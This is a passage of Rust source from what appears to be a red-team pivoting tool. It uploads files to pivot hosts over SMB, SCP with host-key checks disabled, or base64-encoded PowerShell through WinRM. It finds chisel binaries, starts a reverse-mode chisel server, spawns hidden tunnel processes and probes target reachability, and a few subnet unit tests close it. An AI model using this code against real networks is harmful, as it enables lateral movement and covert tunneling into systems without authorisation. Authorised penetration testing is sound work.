        .map_err(|e| format!("smbclient upload failed: {e}"))?;

    if output.status.success() {
        Ok(())
    } else {
        // Fall back: base64 encode and write via WinRM.
        let content = tokio::fs::read(local_path).await
            .map_err(|e| format!("cannot read {local_path}: {e}"))?;
        let b64 = base64_encode(&content);
        // Write in chunks via PowerShell.
        let ps = format!(
            "[IO.File]::WriteAllBytes('{}', [Convert]::FromBase64String('{}'))",
            remote_path, b64
        );
        exec_on_pivot_ps(host, domain, user, pass, &ps).await?;
        Ok(())
    }
}

/// Upload via SCP.
async fn upload_via_scp(host: &str, user: &str, password: Option<&str>, key: Option<&str>, local: &str, remote: &str) -> Result<(), String> {
    let mut args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "UserKnownHostsFile=/dev/null".to_string(),
    ];
    if let Some(k) = key {
        args.push("-i".into());
        args.push(k.into());
    }
    args.push(local.to_string());
    args.push(format!("{}@{}:{}", user, host, remote));

    let output = if let Some(pass) = password {
        tokio::process::Command::new("sshpass")
            .args(["-p", pass, "scp"])
            .args(&args)
            .output()
            .await
    } else {
        tokio::process::Command::new("scp")
            .args(&args)
            .output()
            .await
    };

    match output {
        Ok(o) if o.status.success() => Ok(()),
        Ok(o) => Err(format!("SCP failed: {}", String::from_utf8_lossy(&o.stderr))),
        Err(e) => Err(format!("SCP spawn failed: {e}")),
    }
}

/// Find chisel binary on operator box (native arch for server mode).
fn find_chisel_binary() -> Option<String> {
    for name in ["chisel", "chisel_linux", "chisel.exe"] {
        if let Some(p) = which_path(name) {
            return Some(p);
        }
    }
    for path in [
        "/usr/local/bin/chisel",
        "/usr/bin/chisel",
        "/opt/chisel/chisel",
        "/opt/tools/chisel",
    ] {
        if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

/// Find chisel Windows binary for upload to a Windows pivot host.
fn find_chisel_windows() -> Option<String> {
    for path in [
        "/usr/local/bin/chisel_windows_amd64.exe",
        "/usr/local/bin/chisel.exe",
        "/opt/tools/chisel_windows_amd64.exe",
        "/opt/chisel/chisel.exe",
    ] {
        if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

fn which_path(name: &str) -> Option<String> {
    std::process::Command::new("which")
        .arg(name)
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Start chisel server in reverse mode.
async fn start_chisel_server(port: u16) -> Result<u32, String> {
    let chisel = find_chisel_binary().ok_or("chisel not found")?;
    spawn_tunnel(&chisel, &[
        "server".to_string(),
        "--reverse".to_string(),
        "--port".to_string(),
        port.to_string(),
    ])
}

/// Spawn a background tunnel process.
fn spawn_tunnel(cmd: &str, args: &[String]) -> Result<u32, String> {
    use std::process::{Command, Stdio};
    let child = Command::new(cmd)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("cannot start {cmd}: {e}"))?;
    Ok(child.id())
}

/// Get our IP address from the perspective of a target (the IP we'd connect from).
async fn get_our_ip_for(target: &str) -> Result<String, String> {
    // Parse target to get just the IP.
    let host = target.split(':').next().unwrap_or(target);
    let output = tokio::process::Command::new("python3")
        .args(["-c", &format!(
            "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('{}',1)); print(s.getsockname()[0]); s.close()",
            host
        )])
        .output()
        .await
        .map_err(|e| format!("cannot determine our IP: {e}"))?;
    let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if ip.is_empty() {
        Err("could not determine local IP".into())
    } else {
        Ok(ip)
    }
}

fn base64_encode(data: &[u8]) -> String {
    use std::fmt::Write;
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        out.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

/// Probe whether a host:port is reachable with a short TCP connect.
pub async fn tcp_reachable(host: &str, port: u16, timeout_ms: u64) -> bool {
    let addr = format!("{}:{}", host, port);
    tokio::time::timeout(
        Duration::from_millis(timeout_ms),
        tokio::net::TcpStream::connect(&addr),
    )
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn subnet_matching() {
        assert!(ip_in_subnet("10.0.1.6", "10.0.1.0/24"));
        assert!(!ip_in_subnet("10.0.2.4", "10.0.1.0/24"));
        assert!(ip_in_subnet("10.0.0.5", "10.0.0.0/24"));
        assert!(ip_in_subnet("192.168.1.100", "192.168.0.0/16"));
        // Shorthand without CIDR.
        assert!(ip_in_subnet("10.0.1.6", "10.0.1"));
    }

    #[test]
    fn subnet_extraction() {
        assert_eq!(ip_to_subnet("10.0.1.6"), "10.0.1.0/24");
        assert_eq!(ip_to_subnet("192.168.100.50"), "192.168.100.0/24");
    }

    #[test]
    fn private_ip_check() {
        assert!(is_private_ip("10.0.1.6"));
        assert!(is_private_ip("192.168.1.1"));
        assert!(!is_private_ip("8.8.8.8"));
    }
}
